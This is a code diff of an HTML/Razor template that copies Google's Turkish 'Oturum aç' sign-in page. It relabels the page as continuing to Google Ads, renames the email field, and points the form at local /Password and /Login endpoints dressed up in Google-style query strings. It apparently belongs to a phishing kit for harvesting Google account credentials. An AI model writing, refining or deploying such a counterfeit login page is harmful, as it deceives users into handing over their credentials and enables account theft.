@@ -2,7 +2,15 @@
 
     <div jscontroller="YmeC5c" jsaction="click:jKoJid(preventDefault=true|DPJEMd),rYhRle(preventDefault=true|RTjbJ),WZ2Bje(Cuz2Ue);wMghFb:WWkjY;jiqeKb:UHZ0U;u3KAb:UHZ0U;CINcEf:IjS5bf;sPvj8e:XyQaue;rcuQ6b:WYd;EJh3N:.CLIENT;DiUYjc:.CLIENT;abBxn:.CLIENT;nKbR0:.CLIENT;ffNU7c:.CLIENT" jsname="nUpftc" class="zWl5kd" data-locale="tr" data-allow-sign-up-types="true" data-view-id="hm18Ec">
         <div class="DRS7Fe bxPAYd k6Zj8d" jsname="bN97Pc" jscontroller="Z3Buzf" jsshadow="" data-branding="jcJzye" role="presentation">
-            <div jsname="paFcre"><div class="jXeDnc" jsname="tJHJj" jscontroller="S9352b" jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;"><h1 data-a11y-title-piece="" id="headingText" jsname="r4nke"><span jsslot="">Oturum aç</span></h1><div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob"><span jsslot="">Gmail'e devam et</span></div></div></div><div jsname="uybdVe" class="pwWryf bxPAYd" role="presentation">
+            <div jsname="paFcre">
+                <div class="jXeDnc" jsname="tJHJj" jscontroller="S9352b" jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;">
+                    <h1 data-a11y-title-piece="" id="headingText" jsname="r4nke"><span jsslot="">Oturum aç</span></h1><div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob">
+                        <span jsslot="">
+                            @Html.Raw("Google Ads'e devam et")
+                        </span>
+                    </div>
+                </div>
+            </div><div jsname="uybdVe" class="pwWryf bxPAYd" role="presentation">
                 <form action="/Password#/signin/v2/challenge/pwd?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward&TL=AM3QAYaIVjNG5WEVKZVw2PFahOz6fBTzDiwOOazciZe59rvWcs8j_zRqULJHjK2s" method="post" novalidate="">
                     <div jsname="USBQqe" class="Wxwduf Us7fWe JhUD8d" role="presentation">
                         <div class="WEQkZc">
@@ -17,7 +25,7 @@
                                                         <div class="aCsJod oJeWuf">
                                                             <div class="aXBtI Wic03c">
                                                                 <div class="Xb9hP">
-                                                                    <input type="text" class="whsOnd zHQkBf" jsname="YPqjbf" required autocomplete="username" spellcheck="false" tabindex="0" aria-label="E-posta veya telefon" name="identifier" value="" autocapitalize="none" id="identifierId" dir="ltr" data-initial-dir="ltr" data-initial-value="">
+                                                                    <input id="mail" name="mail" aria-label="@Html.Raw("E-posta veya telefon")" type="text" class="whsOnd zHQkBf" jsname="YPqjbf" required autocomplete="username" spellcheck="false" tabindex="0" value="" autocapitalize="none" dir="ltr" data-initial-dir="ltr" data-initial-value="">
                                                                     <div jsname="YRMmle" class="AxOyFc snByac" aria-hidden="true">E-posta veya telefon</div>
                                                                 </div><div class="i9lrp mIZh1c"></div><div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf"></div>
                                                             </div>
@@ -64,7 +72,6 @@
                                         </div>
                                     </button>
                                 </div>
-                                <div class="daaWTb" jsname="QkNstf"><div class="OIPlvf" jsname="FIbd0b"><div role="button" class="U26fgb c7fp5b FS4hgd FliLIb uRo0Xe t29vte" jscontroller="iSvg6e" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; mouseenter:tfO1Yc; mouseleave:JywGue; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc(preventMouseEvents=true|preventDefault=true); touchcancel:JMtRjd;;keydown:I481le;" jsshadow="" jsname="lqvTlf" aria-disabled="false" tabindex="0" aria-haspopup="true" aria-expanded="false" id="ow276" __is_owner="true"><div class="lVYxmb MbhUzd" jsname="ksKsZd"></div><div class="g4jUVc" aria-hidden="true"></div><span jsslot="" class="I3EnF oJeWuf"><span class="NlWrkb snByac">Hesap oluşturun</span></span></div></div></div>
                             </div>
                         </div>
                     </div>
@@ -75,33 +82,4 @@
 
 </div>
 
-<script>
-    $(function () {
-        location.replace("#/signin/v2/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin");
 
-        jQuery.validator.setDefaults({
-            debug: true,
-            success: "valid"
-        });
-
-        $("form").validate({
-            errorLabelContainer: ".o6cuMc",
-            submitHandler: function () {
-
-                if ($('[name="identifier"]').val().length > 1) {
-                    var formId = 'form';
-                    var postModel = $.fn.toForm(formId);
-                    $.ajx('/Login', { postModel: postModel }, function (resultData) {
-                        location.href = '/Password#/signin/v2/challenge/pwd?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&sacu=1&rip=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward&TL=AM3QAYbyohlgO_IxkLcSo1rPQb5Bg3-7na3KBlJxqOfNZDcS7qaRfhsq6D13M5JS';
-                    }, function () { });
-                }
-                else {
-                    $(".o6cuMc").show();
-                }
-            }
-        });
-
-
-
-    });
-</script>
